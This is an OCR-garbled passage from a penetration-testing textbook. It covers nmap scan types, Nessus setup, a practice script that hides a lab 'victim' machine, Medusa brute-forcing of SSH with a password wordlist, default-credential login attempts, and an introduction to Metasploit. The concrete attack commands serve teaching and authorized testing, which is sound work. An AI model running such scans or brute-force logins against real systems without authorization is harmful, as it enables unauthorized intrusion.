 Please review the e2809cUsing nmap to complete a tcP connect  scane2809d for a detailed breakdown of the switches in this command
 figure 3
3  shows the output of a sYn scan against our target
 take a moment to compare the total run time between the two scans in figures  3
2 and 3
3
 even in our simple environment against a single host the sYn  scan completed its execution faster
 Using Nmap to perform UDp Scans one of the most common port scanning mistakes of new penetration testers is  that they overlook UdP
 these aspiring hackers oftentimes fire up nmap run a  single scan (typically a sYn scan) and move onto vulnerability scanning
 do  not neglect to scan UdP ports! failing to scan your target for open UdP ports  fIGURE 3
3 SYN Scan and Results
 0cScanning ChApTER 3 53 is like reading the cliff notes version of a book
 You will probably have a solid  understanding of the story but you arre likely to miss many of the details
 it is important to understand that both tcP connect scans and sYn scans use  tcP as the basis for their communication
 tcP is an acronym for transmission  control Protocol
 UdP is an acronym for User datagram Protocol
 computers  can communicate with one another using either tcP or UdP; however there  are several key differences between the two protocols
 tcP is considered a e2809cconnection oriented protocole2809d because it requires that the  communication between both the sender and the receiver stays in sync
 this  process ensures that the packets sent from one computer to another arrive at  the receiver intact and in the order they were sent
 on the other hand UdP  is said to be e2809cconnectionlesse2809d because the sender simply sends packets to the  receiver with no mechanism for ensuring that the packets arrive at the desti- nation
 there are many advantages and disadvantages to each of the protocols  including speed reliability and error checking
 to truly master port scanning  you will need to have a solid understanding of these protocols
 take some time  and learn about each of them
 recall that earlier the three-way handshake process was described by compar- ing the process to a phone call
 the three-way handshake is a key component  of tcP communication that allows the sender and the receiver to stay in sync
  Because UdP is connectionless this type of communication is most often com- pared to dropping a letter in a mailbox
 in most cases the sender simply writes  an address on an envelope puts a stamp on the letter and puts the letter in the  mailbox
 eventually the mailman comes along and picks up the letter where  it is entered into the mail routing system
 in this example there is no return  receipt or delivery confirmation for the sender
 once the mailman takes the let- ter the sender has no guarantee that the letter will get to its final destination
 now that you have a very simple understanding of the difference between  tcP and UdP it is important to remember that not every service utilizes tcP
  several prominent services make use of UPd including dHcP dns (for indi- vidual lookups) snmP and tftP
 one of the most important traits for a pen- etration tester to have is thoroughness
 it will be quite embarrassing to you if  you overlook or miss a service because you forgot to run a UdP scan against  your target
 Both the tcP connect scan and the sYn scan use tcP as the basis for their  scanning techniques
 if we want to discover services utilizing UdP we need to  instruct nmap to create scans using UdP packets
 fortunately nmap makes  this process very simple
 to run a UdP scan against our target we would enter  the following command in a terminal: nmap e28093sU 172
16
45
129 notice the difference between this command and the others we have learned
  first we specify the nmap UdP scan by using the e2809ce28093sUe2809d command
 Astute  readers will also notice that the e2809c-p-e2809c and the e2809ce28093Pne2809d switches have been  0cThe Basics of hacking and penetration Testing 54 dropped from the scan
 the reason for this is simple
 UdP scans are very slow;  running even a basic UdP scan on the default 1000 ports can take 20e2809330 min- utes
 You may also notice that the iP address has changed
 in this example we  are scanning a linux machine with the tftP service running
 this will allow us  to see the UPd scan with results
 figure 3
4 shows the output of the scan
 it is important to remember that UdP communication does not require a  response from the receiver
 if the target machine does not send back a reply  saying a packet was received how can nmap differentiate between an open  port and a filtered (firewalled) port? in other words if a service is available  and accepting UdP packets the normal behavior for this service is to simply  accept the packet but not send a message back to the receiver saying e2809cgot it!e2809d  likewise a common firewall strategy is to simply absorb the packet and not  send a response packet back to the sender
 in this example even though one  packet went through and one packet was blocked because no packets were  returned to the sender there is no way of knowing if the packet was accepted  by a service or dropped by the firewall
 this conundrum makes it very difficult for nmap to determine if a UdP port  is open or filtered
 As a result when nmap does not receive a response from a  UdP scan it returns the following message for the port e2809copen | filtered
e2809d it is  important to note that on rare occasions a UdP service will send a response  back to the original source
 in these cases nmap is smart enough to under- stand that there is clearly a service listening and responding to requests and  will mark those ports as e2809copen
e2809d As was discussed earlier oftentimes people who are new to port scanning over- look UdP scans
 this is probably due in part to the fact that most ordinary  UdP port scans provide very little information and mark nearly every port as  e2809copen | filtered
e2809d After seeing the same output on several different hosts it is  easy to become disillusioned with UdP scans
 However all is not lost! the fine  folks who wrote nmap provide us with a way to draw more accurate results  from our UdP scans
 fIGURE 3
4 UPD Scan Command and Result
 Openmirrors
com 0cScanning ChApTER 3 55 to elicit a more useful response from our target we can add the e2809ce28093sVe2809d switch  to our UdP scan
 the e2809ce28093sVe2809d switch is used for version scanning but in this  case can also help us narrow the results of our UPd scan
 when version scanning is enabled nmap sends additional probes to every  e2809copen | filterede2809d port that is reported by the scan
 these additional probes  attempt to identify services by sending specifically crafted packets
 these spe- cially crafted packets are often much more successful in provoking a response  from the target
 oftentimes this will change the reported results from e2809copen |  filterede2809d to e2809copen
e2809d As mentioned above the simplest way to add version scanning to a UdP probe  is to include the e2809ce28093sVe2809d switch
 Please note that because we are already using  the e2809ce28093sUe2809d switch to specify the type of scan we can simply append the capital  V onto the back of the e2809ce28093sU
e2809d As a result our new command becomes: nmap e28093sUV 172
16
45
135 Using Nmap to perform an Xmas Scan in the computer world an rfc is a document that contains either notes or  the technical specifications covering a given technology or standard
 rfcs can  provide us with a tremendous amount of detail about the inner workings of a  particular system
 Because rfcs describe the technical details of how a system  should work attackers and hackers will often review rfcs looking for potential  weaknesses or loopholes described in the documentation
 xmas tree scans and  null scans exploit just such a loophole
 xmas tree scans get their name from the fact that the fin PsH and Urg  packet flags are set to e2809cone2809d; as a result the packet has so many flags turned on  and the packet is often described as being e2809clit up like a christmas tree
e2809d given  what we already know about tcP communications and the three-way hand- shake it should be clear that an xmas tree packet is highly unusual because nei- ther the sYn nor Ack flags are set
 However this unusual packet has a purpose
  if the system we are scanning has followed the tcP rfc implementation we  can send one of these unusual packets to determine the current state of the port
 the tcP rfc says that if a closed port receives a packet that does not have a  sYn Ack or rst flag set (i
e
 the type of packet that is created from an xmas  tree scan) the port should respond with an rst packet of its own
 furthermore  the rfc states that if the port is open and it receives a packet without a sYn  Ack or rst flag set the packet should be ignored
 take a moment to reread the  last two sentences as they are critical to understanding the response we get from  these scans
 Assuming the operating system of the target fully complies with the tcP rfc  nmap is able to determine the port state without completing or even initiating  a connection on the target system
 the word e2809cassuminge2809d was used because not  every operating system on the market today is fully rfc compliant
 in general  the xmas tree and null scans work against Unix and linux machines but not  0cThe Basics of hacking and penetration Testing 56 windows
 As a result xmas tree and null scans are rather ineffective against  microsoft targets
 to execute an xmas tree scan we simply replace the e2809c-sUe2809d switch from our last  example with an e2809c-sx
e2809d to run the full scan in the terminal we would enter: nmap e28093sX -p- -PN 172
16
45
129 figure 3
5 shows the command and output of an xmas tree scan against a  linux target
 Using Nmap to perform Null Scans null scans like xmas tree scans are probes made with packets that violate tra- ditional tcP communication
 in many ways the null scan is the exact oppo- site of a xmas tree scan because the null scan utilizes packets that are devoid  of any flags (completely empty)
 target systems will respond to null scans in the exact same way they respond  to xmas tree scans
 specifically an open port on the target system will send  no response back to nmap whereas a closed port will respond with an rst  packet
 it is important to remember that these scans are only reliable for oper- ating systems that comply 100 percent with the tcP rfc
 one of the main advantages of running xmas tree and null scans is that  in some cases you are able to bypass simple filters and Access control lists  (Acls)
 some of these primitive filters work by blocking inbound sYn packets
  the thought with this type of filter is that by preventing the sYn packet from  entering the system it is not possible for the three-way handshake to occur
 if  the three-way handshake does not occur there can be no tcP communication  streams between the systems or more precisely no tcP communications can  be originated from outside of the filter
 it is important to understand that neither the xmas tree nor the null scans  seek to establish any type of communication channel
 the whole goal of these  scans is to determine if a port is open or closed
 fIGURE 3
5 Xmas Tree Scan Command and Result
 0cScanning ChApTER 3 57 with the previous two paragraphs in mind consider the following example
  Assume that our network Admin Ben owned puts a simple firewall in front  of his system to prevent anyone outside of his network from connecting to  the system
 the firewall works by simply dropping any external communica- tions that begin with a sYn packet
 Ben hires his buddy the ethical hacker to  scan his system
 the ethical hackere28099s initial tcP connect scans show nothing
  However being a seasoned penetration tester the ethical hacker follows up his  initial scan with UdP xmas tree and null scans
 the ethical hacker smiles  when he discovers that both his xmas tree scans and null scans reveal open  ports on Bene28099s system
 this scenario is possible because nmap creates packets without the sYn flag  set
 Because the filter is only dropping incoming packets with the sYn flag the  xmas tree and null packets are allowed through
 to run a null scan we issue  the following command in a terminal: nmap e28093sN -p- -PN 172
16
45
129 port Scanning Wrap Up now that we have covered the basics of port scanning there are a few addi- tional switches that need to be covered
 these switches provide additional  functionality that may be useful to you as you progress in your penetration  testing career
 As mentioned earlier the e2809c-sVe2809d switch is used for version scanning
 when con- ducting version scanning nmap sends probes to the open port in an attempt  to determine specific information about the service that is listening
 when  possible nmap will provide details about the service including version num- bers and other banner information
 this information should be recorded in  your notes
 it is recommended that you use the e2809c-sVe2809d switch whenever possi- ble especially on unusual or unexpected ports because a wily administrator  may have moved his web server to port 34567 in an attempt to obscure the  service
 nmap includes an option to change the speed of your port scan
 this is done  with the e2809c-te2809d switch
 the timing switch ranges on a numeric scale from 0 to 5  with 0 being the slowest scan and 5 being the fastest
 timing options are useful  if you are attempting to avoid detection by sending your scan more slowly; or  if you have a large number of iPs to scan and you have a limited time to com- plete the scan where faster scans would be more appropriate
 Please be aware  that by using the fastest scans possible nmap may provide less accurate results
 lastly the e2809c-oe2809d switch can be useful for fingerprinting the operating system
  this is handy for determining if the target you are attacking is a windows  linux or other type of machine
 knowing the operating system of your target  will save you time by allowing you to focus your attacks to known weaknesses  of that system
 there is no use in exploring exploits for a linux machine if your  target is running windows
 0cThe Basics of hacking and penetration Testing 58 once we have completed port scanning our target we should have a list of  open ports and services
 this information should be documented and reviewed  closely
 while reviewing the nmap output you should take a few moments to  attempt to log into any remote access services that were discovered in your port  scan
 the next chapter will address running a brute force tool to attempt to log  in
 for the time being you can attempt to log in using default usernames and  passwords
 You could also try logging in using any information usernames or  e-mail addresses you found during reconnaissance
 it is possible to complete a  penetration test by simply discovering an open remote connection and logging  into the box with a default username and password
 telnet and ssH are great  remote services that you should always try to connect to
 You can do this from  the command line by typing: telnet target_ip ssh root@target_ip in this example the e2809ctarget_ipe2809d is the iP address of your victim
 most likely  these will fail but on the rare occasion when you are successful these are an  absolute home run
 vULNERABILITy SCANNING now that we have a list of iPs open ports and services on each machine it  is time to scan the targets for vulnerabilities
 A vulnerability is a weakness in  the software or system configuration that can be exploited
 Vulnerabilities  can come in many forms but most often they are associated with missing  patches
 Vendors often release patches to fix a known problem or vulnerability
  Unpatched software and systems often lead to quick penetration tests because  some vulnerabilities allow remote code execution
 remote code execution is  definitely one of the holy grails of hacking
 it is important to understand this step as the results will feed directly into step  3 where we will gain access to the system
 to scan systems for vulnerabilities  we will use a vulnerability scanner
 there are several good scanners available to  you but for this book we will be focusing on nessus
 nessus is a great tool and available for free for a home user from their website
  You can download a full-fledged version of nessus and get a key for free
 if you  are going to use nessus in a corporate environment you will need to sign up  for the Professional feed rather than the Home feed
 the Professional feed will  run you about $100 a month
 we will be using the Home version for this book
 installing nessus is very straightforward
 it will run on either linux or windows
  nessus runs using a client/server architecture
 once set up the server runs quietly  in the background and you interact with the server through a browser
 to install  nessus you need to complete the following steps: 1
 download the installer from www
nessus
org
 2
 register for a key on the nessus website by submitting your e-mail address
  the nessus crew will e-mail you a unique product key that can be used to  register the product
 0cScanning ChApTER 3 59 3
 install the program
 4
 create a nessus user to access the system
 5
 Update the plug-ins
 one of the key components of nessus is the plug-ins
 A plug-in is a small  block of code that is sent to the target machine to check for a known vulner- ability
 nessus has literally thousands of plug-ins
 these will need to be down- loaded the first time you start the program
 the default installation will set up  nessus to automatically update the plug-ins for you
 once you have installed the nessus server you can access it by opening a  browser and entering https://127
0
0
1:8834 in the Url (assuming you are  accessing nessus on the same computer you installed the server on)
 do not  forget the e2809chttpse2809d in the Url as nessus uses a secure connection when com- municating with the server
 You will be prompted with a log-in screen
 You  can use the username and password you created when installing the program
  once you log into the program you will be presented with a screen similar to  figure 3
6
 Before we can use nessus we need to set up a scan policy
 You can do this  by clicking on the e2809cPoliciese2809d tab at the top of the web page
 to set up a scan  policy you need to provide a name
 if you are going to set up multiple policies  you should also enter a description
 Please take a minute to review figure 3
6  and notice there is a check in the box next to e2809csafe checks
e2809d when setting up nessus for the first time it is common to create two   policies: one with the e2809csafe checkse2809d checked and the other with the e2809csafe  checkse2809d unchecked
 the reason for this is simple
 some plug-ins and checks  are considered dangerous because they check for the vulnerability by attempt- ing to actually exploit the system
 Be aware that removing the e2809csafe checkse2809d  fIGURE 3
6 Screenshot of Nessus
 Openmirrors
com 0cThe Basics of hacking and penetration Testing 60 check has the potential to cause network and system disruptions or even take  systems off-line
 By setting up one policy with the e2809csafe checkse2809d enabled and  one with the e2809csafe checkse2809d disabled you can avoid unintentional network  disruptions
 there are many options that you can use to customize your scan
 for the pur- pose of this book we will use the defaults
 take a moment to review the vari- ous options by clicking e2809cnexte2809d in the lower right
 this will take you through  each of the remaining pages where you can set additional options for your  scan
 once your scan is set you can save it by clicking on the e2809csubmite2809d button that  will appear after you have reviewed each of the scan option pages
 You only  need to set up your scan policy one time
 once your scan has been submitted  you will be able to use that policy to perform vulnerability scans against your  target
 now that you have a scan policy set up you can run a scan against your target
  to set up a scan you need to click on the e2809cscanse2809d link located in the top menu
  You can enter individual addresses to scan a single target or a list of iPs to scan  multiple hosts
 figure 3
7 shows the e2809cscane2809d screen
 fIGURE 3
7 Setting up the Nessus Scan
 0cScanning ChApTER 3 61 You need to enter a name for the scan select a policy and enter the iP address  of your targets
 You can enter your target iP addresses individually in the e2809cscan  targetse2809d box or if you have your target iP addresses saved to a text file you can  use the e2809cBrowsee280a6e2809d button to locate and load it
 once your options are set you  can click on the e2809claunch scane2809d button in the lower right
 nessus will provide  you with information about the progress of your scan while it is running
 when nessus finishes the scan you will be able to review the results by click- ing on the e2809creportse2809d link in the menu bar
 the report will provide you with a  detailed listing of all the vulnerabilities that nessus discovered
 we are espe- cially interested in vulnerabilities labeled as High
 You should take time to  closely review the report and make detailed notes about the system
 we will  use these results in the next step to gain access to the system
 once we have completed port scanning and vulnerability scanning for each   of our targets we should have enough information to begin attacking the  system
 hOW DO I pRACTICE ThIS STEp? the easiest way to practice port scanning is to set up two machines or use   virtual machines
 You should work your way through each of the options   and scan types that we covered in this chapter
 Pay special attention to the out- put from each scan
 You should run scans against both linux and windows  boxes
 You will probably want to add some services or programs to the target system  so that you can be sure you will have open ports
 installing and starting ftP a  web server telnet or ssH will work nicely
 when a person is first learning about port scanning one of the best ways to  practice is to pick a subnet and hide an iP address in the network
 After hid- ing the target in the subnet the goal is to locate the target
 once the target has  been located the next step is to conduct a full port scan of the system
 to assist with the scenario described above a simple script has been created  which can be used to e2809chidee2809d your system in a given subnet
 the code is meant  to be run on a linux machine
 feel free to modify it by changing the iP address  so that it will work on your network
 the script generates a random num- ber between 1 and 254
 this number is to be used as the final octet in the iP  address
 once the random iP address is created the script applies the address  to the machine
 running this script will allow you to become familiar with the tools and tech- niques we covered in this chapter
 You can enter the script into a text editor  and save the file as iP_gen
sh
 0cThe Basics of hacking and penetration Testing 62 #!/bin/bash echo "Setting up the victim machine this will take just a  moment


" ifconfig eth0 down ifconfig eth0 172
16
45
$((( $RANDOM %254) ee80b1 1)) up # uncomment the following lines by removing the # to start up  services on your victim # please note you may need to change the location / path depending  on your distro #/etc/init
d/ssh start # note you may have to generate your SSH key using sshd-generate #/etc/init
d/apache2 start #/etc/init
d/atftpd start echo "This victim machine is now setup
" echo "The IP address is somewhere in the 172
16
45
0/24 network
" echo "You may now close this window and begin your attack


Good  luck!" You will need to use a terminal to navigate to the directory where you created  the file
 You need to make the file executable before you can run it
 You can do  this by typing: chmod 755 IP_Gen
sh to run the script you type the following command into a terminal: 
/IP_Gen
sh the script should run and provide you with a message saying the victim  machine is all set up
 Using the script above you will be able to practice locat- ing and scanning a target machine
 WhERE DO I GO fROM hERE? once you have mastered the basics of nmap and nessus you should dig into  the advanced options for both tools
 this chapter only scratched the surface  of both of these fine tools
 insecure
org is a great resource for learning more  about nmap
 You should dedicate time to exploring and learning all of the var- ious switches and options
 likewise nessus has a plethora of additional fea- tures
 take time to review the various scans and policy options
 After you are comfortable with the advanced features of these tools you should  look at other scanners as well
 there are dozens of good port scanners avail- able
 Pick a few install them and learn their features
 there are several com- mercial products that you should become familiar with; these products are not  exclusively vulnerability scanners (they are much more) but core impact and  saint both provide excellent vulnerability assessment components although  both of these tools will cost you actual cash
 0cScanning ChApTER 3 63 SUMMARy this chapter focused on step 2 that consists mainly of scanning
 the chapter  started with a brief overview of pings and ping sweeps before moving into the  specifics of scanning
 the topic of scanning is further broken down into two  distinct types including port scanning and vulnerability scanning
 the port  scanner nmap was introduced and several different types of scans were dis- cussed
 Actual examples and outputs of the various scans were demonstrated  as well as the interpretation of the nmap output
 the concept of vulnerability  scanning was introduced through the use of nessus
 Practical examples were  presented and discussed throughout the chapter
 0cThis page intentionally left blank 0c65 INTRODUCTION exploitation is the process of gaining control over a system
 this process can  take many different forms but for the purpose of this book the end goal always  remains the same: administrative-level access to the computer
 in many ways  Exploitation ChApTER 4 Information in This Chapter: n Gaining Access to Remote Services with Medusa n Metasploit: Hacking Hugh Jackman Style! n John the Ripper: King of the Password Crackers n Password Resetting: Kind of Like Driving a Bulldozer through the Side of a  Building n Sniffing Network Traffic n Macof: Making Chicken Salad Out of Chicken Sh*t n Fast-Track Autopwn: Breaking Out the M-60 0cThe Basics of hacking and penetration Testing 66 exploitation is the attempt to turn the target machine into a puppet that will  execute your commands and do your bidding
 Just to be clear exploitation is  the process of launching an exploit
 An exploit is the realization of a vulner- ability
 exploits are issues or bugs in the software code that allow a hacker or  attacker to alter the original functionality of the software
 of all the steps we cover exploitation is probably the step aspiring hackers  are most interested in
 it certainly gets a lot of attention because this phase  involves many of the traditional activities that people associate with e2809chackinge2809d  and penetration testing
 there are volumes of books that are dedicated to the  process of exploitation
 Unfortunately there are also volumes of misinforma- tion regarding step 3
 stories from Hollywood and urban legends of famed  hacker exploits have tainted the mind of many newcomers
 However this does  not mean that exploitation is any less exciting or exhilarating
 on the contrary  exploitation is still my favorite step even if there is a little less e2809cshock and awee2809d  than portrayed in a typical hacker movie
 But when completed successfully  exploitation remains simply breathtaking
 of all the steps we discuss exploitation is probably the least well defined and  most open to interpretation
 when combined these two qualities often bring  chaos and confusion to people trying to learn penetration testing and hacking
  the lack of order and structure in a penetration test often leads to frustration  and failure
 it is not uncommon for a novice to read about a new tool or lis- ten to a speaker talk about some advanced technique that can be used to gain  access to a system and want to jump directly to step 3 (exploitation)
 However  it is important to remember that penetration testing is more than just exploi- tation
 fortunately by following the process identified in this book or by any  other solid penetration testing methodology you can alleviate many of these  issues
 Because this book focuses on the basics and as a final warning it is critical to  stress the importance of completing steps 1 and 2 prior to conducting exploi- tation
 it can be tempting to bypass reconnaissance and scanning and jump  directly to chapter 4
 that is ok for now but if you are ever going to advance  your skills beyond the script kiddie level you will need to master the other  steps as well
 the failure to do so will not only severely limit your ability to  grow as a penetration tester but will also eventually stunt your growth as an  exploitation expert
 reconnaissance and scanning will help to bring order and  direction to exploitation
 ok
 now that the speech is over let us put away the soapbox and get to the  business at hand: exploitation
 As mentioned earlier exploitation is the most  free-flowing phase we will cover
 the reason for this is simple; each system is  different and each target is unique
 depending on a multitude of factors your  attack vectors will vary from target to target
 different operating systems dif- ferent services and different processes require different types of attacks
 skilled  attackers have to understand the nuances of each system they are attempting  to exploit
 As your skills continue to progress from Padawan to Jedi you will  Openmirrors
com 0cExploitation ChApTER 4 67 need to expand your knowledge of systems and their exploits
 eventually you  will learn how to create custom exploits
 You can use the previous stepe28099s output as a guide for where to begin your  exploitation attempts
 the output from scanning should be used to help shape  focus and direct your attacks
 GAINING ACCESS TO REMOTE SERvICES WITh  MEDUSA when reviewing the output from step 2 always make special notes of iP  addresses that include some type of remote access service
 ssH telnet ftP Pc  Anywhere and Vnc are popular choices because gaining access to these ser- vices often results in the complete owning of that target
 Upon discovery of one  of these services hackers typically turn to an e2809conline password cracker
e2809d online  password crackers work by attempting to brute force their way into a system by  trying an exhaustive list of passwords and/or username combinations
 when using online password crackers the potential for success can be greatly  increased if you combine this attack with information gathered from step 1
  specifically you should be sure to include any usernames or passwords you  discovered
 the process of online password cracking literally requires the  attacking program to send a username and a password to the target
 if either  the username or password is incorrect the attack program will be presented  with an error message and the log-in will fail
 the password cracker will then  send the next username and password combination
 this process continues  until the program is either successful in finding a login/password combo or  it exhausts all the guesses
 on the whole even though computers are great at  repetitive tasks like this the process is rather slow
 You should be aware that some remote access systems employ a password  throttling technique that can limit the number of unsuccessful log-ins you are  allowed
 in these instances either your iP address can be blocked or the user- name can be locked out
 there are many different tools that can be used for online password cracking
  two of the most popular tools are medusa and Hydra
 these tools are very  similar in nature
 in this book the focus will be on medusa but it is strongly  encouraged that you become familiar with Hydra as well
 medusa is described as a parallel log-in brute forcer that attempts to gain access  to remote authentication services
 medusa is capable of authenticating with  a large number of remote services including AfP ftP HttP imAP ms-sQl  mysQl netware ncP nntP PcAnywhere PoP3 rexec rlogin smtP- AUtH snmP ssHv2 telnet Vnc web form and more
 in order to use medusa you need several pieces of information including  the target iP address a username or username list that you are attempting to  log in as a password or dictionary file containing multiple passwords to use   0cThe Basics of hacking and penetration Testing 68 when logging in and the name of the service you are attempting to authenti- cate with
 one of the requirements listed above is a dictionary list
 A password dictionary  is a file that contains a list of potential passwords
 these lists are often referred  to as dictionaries because they contain thousands or even millions of individual  words
 People often use plain english words or some small variation like a 1 for  an i or a 5 for an s when they create passwords
 Password lists attempt to collect  as many of these words as possible
 some hackers and penetration testers spend  years building password dictionaries that grow to gigabytes in size
 A good dic- tionary can be extremely useful but often requires a lot of time and attention to  keep clean
 clean dictionaries are streamlined and free of duplication
 there are plenty of small wordlists that can be downloaded from the internet  and serve as a good starting point for building your own personal password  dictionary
 there are also tools available that will build dictionaries for us
  However fortunately the fine folks at Backtrack have already included a few  word lists for us to use
 You can find these dictionaries in the /pentest/pass- words/wordlists directory
 there is also a small list included with the John  the ripper located at: /pentest/passwords/jtr/password
lst
 once you have your password dictionary you need to decide if you are going  to attempt to log in as a single user or if you want to supply a list of potential  users
 if your reconnaissance efforts were rewarded with a list of usernames  you may want to start with those
 if you were unsuccessful in gathering user- names and passwords you may want to focus on the results of the e-mail  addresses you collected with the Harvester
 remember the first part of an  e-mail address can often be used to generate a working domain username
 Assume that during your penetration test you were unable to find any domain  usernames
 However the Harvester was able to dig up the e-mail address ben
 owned@example
com
 when using medusa one option is to create a list of  potential usernames based on the e-mail address
 these would include ben
 owned benowned bowned ownedb and several other combinations derived  from the e-mail address
 After creating a list of 5e2809310 usernames it is possible to  feed this list into medusa and attempt to brute force my way into the remote  authentication service
 now that we have a target iP address with some remote authentication ser- vice (we will assume ssH for this example) a password dictionary and at least  one username we are ready to run medusa
 in order to execute the attack you  open a terminal and issue the following command: medusa e28093h target_ip e28093u username e28093P path_to_password_dictionary e28093M  authentication_service_to_attack take a moment to examine this command in more detail; you will need to cus- tomize the information for your target: the first keyword e2809cmedusae2809d is used to start the brute forcing program
 e2809c-he2809d is used to specify the iP address of the target host
 Openmirrors
com 0cExploitation ChApTER 4 69 the e2809c-ue2809d is used to denote a single username that medusa will use to  attempt log-ins
 if you generated a list of usernames and would like to attempt to log in  with each of the names on the list you can issue a capital e2809c-Ue2809d followed by  the path to the username file
 likewise the lowercase e2809c-pe2809d is used to specify a single password whereas a  capital e2809c-Pe2809d is used to specify an entire list containing multiple passwords
  the e2809c-Pe2809d needs to be followed by the actual location or path to the diction- ary file
 the e2809c-me2809d switch is used to specify which service we want to attack
 to clarify this attack let us continue with the example we set up earlier
  suppose we have been hired to conduct a penetration test against the com- pany e2809cexample
com
e2809d during our information gathering with metagoofil we  uncover the username of e2809cownedbe2809d and an iP address of 172
16
45
129
 After  port scanning the target we discover that the server is running ssH on port 22
  moving to step 3 one of the first things to do is to attempt to brute force our  way into the server
 After firing up Backtrack and opening a terminal we issue  the following command: medusa e28093h 172
16
45
129 e28093u ownedb e28093P /pentest/passwords/wordlists/ darkc0de
lst e28093M ssh figure 4
1 shows the command and its associated output
 fIGURE 4
1 Using Medusa to Brute Force into SSH
 Openmirrors
com 0cThe Basics of hacking and penetration Testing 70 the first line shows the command we issued; the second line is an informa- tional banner that is displayed when the program begins
 the remaining lines  show a series of log-in attempts with the username e2809cownedbe2809d and various pass- words beginning with e2809c[1B]
e2809d notice on the 11th log-in attempt medusa is suc- cessful in accessing the system with a username of e2809cownedbe2809d and a password of  e2809c!power
e2809d At this point we would be able to remotely log in as the user
 depending on the level of engagement and goals identified in your authoriza- tion and agreement form you may be done with the penetration test at this  point
 congratulations! You just completed your first penetration test and suc- cessfully gained access to a remote system
 Although it is not always quite that easy you will be surprised at how many  times a simple tactic like this works and allows you full access and control of a  remote system
 METASpLOIT: hACKING hUGh JACKMAN STyLE! of all the tools discussed in this book metasploit is my favorite
 in many ways  it is the quintessential hacker tool
 it is powerful flexible free and loaded  with awesomeness
 it is without a doubt the coolest offensive tool covered in  this book and in some cases it even allows you to hack like Hugh Jackman in  swordfish! seriously it is that good
 if you ever get a chance to meet Hd moore  or any of the other original metasploit crew buy them a beer shake their hand  and say thanks because metasploit is All that and more
 in 2004 at defcon 12 Hd moore and spoonm rocked the world when they  gave a talk titled e2809cmetasploit: Hacking like in the movies
e2809d this presentation  focused on e2809cexploit frameworks
e2809d An exploit framework is formal structure for  developing and launching exploits
 frameworks assist the development process  by providing organization and guidelines for how the various pieces are assem- bled and interact with each other
 metasploit actually started out as a network game but its full potential was  realized when it was transformed into a full-fledged exploit tool
 metasploit  actually contains a suite of tools including some great anti-forensics stuff;  however the project is probably best known for the metasploit framework  component
 ALERT! If you are having problems getting Medusa (or any of the tools covered in this book)  to run on your version of Backtrack it may be helpful to reinstall the program as we  discussed in Chapter 1
 You can reinstall Medusa with the following commands: apt-get update apt-get install medusa 0cExploitation ChApTER 4 71 Before the release of metasploit security researchers had two main choices:  they could develop custom code by piecing together various exploits and pay- loads or they could invest in one of the two commercially available exploit  frameworks core impact or imunitysece28099s cAnVAs
 Both impact and cAnVAs  were great choices and highly successful in their own right
 Unfortunately the  cost to license and use these products meant many security researchers did not  have access to them
 metasploit was different from everything else because for the first time hack- ers and penetration testers had access to a truly open source exploit framework
  this meant that for the first time everyone could access collaborate develop  and share exploits for free
 it also meant that exploits could be developed in an  almost factory-like assembly line approach
 the assembly line approach allowed  hackers and penetration testers to build exploits based on their own needs
 metasploit allows you to select the target and choose from a wide variety of  payloads
 the payloads are interchangeable and not tied to a specific exploit
 A  payload is the e2809cadditional functionalitye2809d or change in behavior that you want  to accomplish on the target machine
 it is the answer to the question: e2809cwhat  do i want to do now that i have control of the machine?e2809d metasploite28099s most  popular payloads include adding new users opening backdoors and installing  new software onto a target machine
 the full list of metasploit payloads will be  covered shortly
 Before we begin covering the details of how to use metasploit it is important  to understand the distinction between metasploit and a vulnerability scanner
  in most instances when we use a vulnerability scanner the scanner will only  check to see if a system is vulnerable
 this occurs in a very passive way with little  chance of any unintentional damage or disruption to the target
 metasploit and  other frameworks are exploitation tools
 these tools do not perform tests; these  tools are used to complete the actual exploitation of the target
 Vulnerability  scanners look for and report potential weaknesses
 metasploit attempts to actu- ally exploit the systems it scans
 make sure you understand this
 in 2009 rapid 7 purchased metasploit
 Hd moore spent a considerable  amount of time putting people at ease and reassuring everyone that metasploit  would remain free
 Although several great commercial products have since been  released including metasploit express and metasploit Pro Hd has been true to  his word and the original metasploit project remains free
 in fact the purchase  of metasploit by rapid 7 has been a huge boost to the metasploit project
 the  open source project is clearly benefitting from the commercial tool push with  additional full-time developers and staff
 the rate at which new exploits and  functionality is being added is staggering
 we will focus on the basics here but  you will want to stay on top of latest developments going forward
 metasploit can be downloaded for free by clicking on the framework link  located at http://www
metasploit
com
 if you are using Backtrack metasploit  is already installed for you
 there are several different ways to interact with  Openmirrors
com 0cThe Basics of hacking and penetration Testing 72 metasploit but this book will focus on using the menu-driven non-gUi  text-based system called the msfconsole
 once you understand the basics  the msfconsole is fast friendly intuitive and easy to use
 when possible you  should avoid the msfweb or msfgui versions especially when first learning
 we can access the msfconsole by either opening a terminal window and  entering: /pentest/exploits/framework3/msfconsole the msfconsole can also be accessed through the menu by clicking on the  k-start dragon and navigating to: Backtrack e28692 Penetration e28692 metasploit  exploitation framework e28692 framework Version 3 e28692 msfconsole
 starting the msfconsole takes between 10 and 30 seconds so do not panic if  nothing happens for a few moments
 eventually metasploit will start by pre- senting you with a welcome banner and an e2809cmsfee80aee2809d command prompt
 there  are several different metasploit banners that are rotated and displayed at ran- dom so if your screen looks different from figure 4
2 that is normal
 the  important thing is that you get the msfee80ae console
 the initial metasploit screen  is shown in figure 4
2
 Please notice when metasploit first loads it shows you the number of exploits  payloads encoders and nops available
 it also shows you how many days have  passed since your last update
 Because of metasploite28099s rapid growth and official  funding it is vital that you keep metasploit up-to-date
 this is easily accom- plished by entering the following command after the e2809cmsfee80aee2809d prompt: msfup- date
 get into the habit of running this command often
 now that metasploit is updated let us begin exploring the awesomeness of this  tool
 in order to use metasploit a target must be identified and exploit must be  fIGURE 4
2 Initial Metasploit Screen
 0cExploitation ChApTER 4 73 selected a payload needs to be picked and the exploit itself must be launched
  we will review the details of each of these in just a few moments but before  that let us review the basics of metasploit terminology
 As mentioned earlier  an exploit is a prepackaged collection of code that gets sent to a remote system
  this code causes some atypical behavior on the target system that allows us to  execute a payload
 recall that a payload is also a small snippet of code that is  used to perform some task like installing new software creating new users or  opening backdoors to the system
 exploits are the weaknesses that allow the attacker to execute remote code  (payloads) on the target system
 Payloads are the additional software or func- tionality that we install on the target system once the exploit has been success- fully executed
 now that we have an understanding of how to access and start the msfconsole  and a solid understanding of the terminology used let us examine how we  can use metasploit
 when first hearing about and using metasploit a common  mistake of would-be hackers and penetration testers is the lack of organization  and thoughtfulness
 remember metasploit is like a scalpel not a hatchet
 or  maybe more appropriately metasploit is like a Barrett m107 sniper rifle not a  m60 machine gun
